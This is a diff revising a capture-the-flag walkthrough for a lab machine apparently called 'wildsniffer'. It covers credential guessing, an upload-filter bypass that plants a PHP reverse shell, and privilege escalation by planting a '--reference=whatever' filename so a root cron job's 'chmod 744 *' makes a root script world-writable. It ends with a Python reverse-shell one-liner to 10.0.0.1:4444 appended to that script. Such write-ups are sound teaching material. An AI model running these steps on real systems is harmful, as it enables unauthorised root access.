@@ -166,23 +166,26 @@ goku:dragonballsuper
 
 ## Exploitation
 
-We would use those creds to login into sniffer.com but get invalid creds
+We can use those creds to login into sniffer.com 
 ```
 http://sniffer.com/admin/login.php
 ```
-Recalling the intern-roles.txt file earlier from ftp, that had lot of users, we try to login into those users to find valid combo
-```
-We get valid combo
+After trying the password we get invalid credentials.
 
+So Recalling the intern-roles.txt file earlier we got from the ftp we get a username list.
+
+After trying many combinations we  get a valid combo
+```
 tom:dragonballsuper
 ```
-After login, we select content -> File Manager
+After login, select 'Content -> File Manager' from the left
 
 Here we can try to upload our php reverse shell, but as it would block php files by default, we would rename our file to rev.txt and upload.
 
 After it gets uploaded, we would select our file "rev.txt" and click on copy and set new Target File name: as rev.php.
 
 Execute rev.php and get a Reverse Shell
+
 
 ## User Escalation
 
@@ -225,44 +228,44 @@ We can use this "--reference=RFILE" to our advantage.
 Create any file with 777 permission and give reference to that file
 
 ```
-root@Ubuntu-18:/home/dev# ls -la
+www-data@wildsniffer:/home/dev# ls -la
 total 12
 drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:39 .
 drwxr-xr-x 5 root     root     4096 Sep 30 18:38 ..
 -rwxr--r-- 1 root     root       60 Sep 30 18:43 sentinal.sh
 
-root@Ubuntu-18:/home/dev# echo "" > whatever
-root@Ubuntu-18:/home/dev# chmod 777 whatever
+www-data@wildsniffer:/home/dev# echo "" > whatever
+www-data@wildsniffer:/home/dev# chmod 777 whatever
 
-root@Ubuntu-18:/home/dev# echo "" > --reference=whatever
+www-data@wildsniffer:/home/dev# echo "" > --reference=whatever
 
-root@Ubuntu-18:/home/dev# ls -la
+www-data@wildsniffer:/home/dev# ls -la
 total 20
--rw-r--r-- 1 root     root        1 Sep 30 18:44 '--reference=whatever'
+-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
 drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
 drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
--rwxrwxrwx 1 root     root        1 Sep 30 18:43  whatever
+-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
 -rwxr--r-- 1 root     root       60 Sep 30 18:44  sentinal.sh
 
-root@Ubuntu-18:/home/dev# ls -la
+www-data@wildsniffer:/home/dev# ls -la
 total 20
--rw-r--r-- 1 root     root        1 Sep 30 18:44 '--reference=whatever'
+-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
 drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
 drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
--rwxrwxrwx 1 root     root        1 Sep 30 18:43  whatever
+-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
 -rwxrwxrwx 1 root     root       60 Sep 30 18:46  sentinal.sh
 ```
-As you can see, when chmod 744 * executed from crontab it took reference of our whatever file which has 777 permisson and thus changing permisson of sentinal.sh to 777
+When chmod 744 * is executed as cron job it took reference of file "whatever" having permisson "777" and thus changing permisson of all files to 777
 ```
-root@Ubuntu-18:/home/dev# ls -la
+www-data@wildsniffer:/home/dev# ls -la
 total 20
--rw-r--r-- 1 root     root        1 Sep 30 18:44 '--reference=whatever'
+-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
 drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
 drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
--rwxrwxrwx 1 root     root        1 Sep 30 18:43  whatever
+-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
 -rwxrwxrwx 1 root     root       60 Sep 30 18:46  sentinal.sh
 ```
-Add your reverse shell to sentinal.sh and get a root shell
+Add reverse shell in sentinal.sh file to get a root shell when next cron is executed
 ```
 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> sentinal.sh
 ```
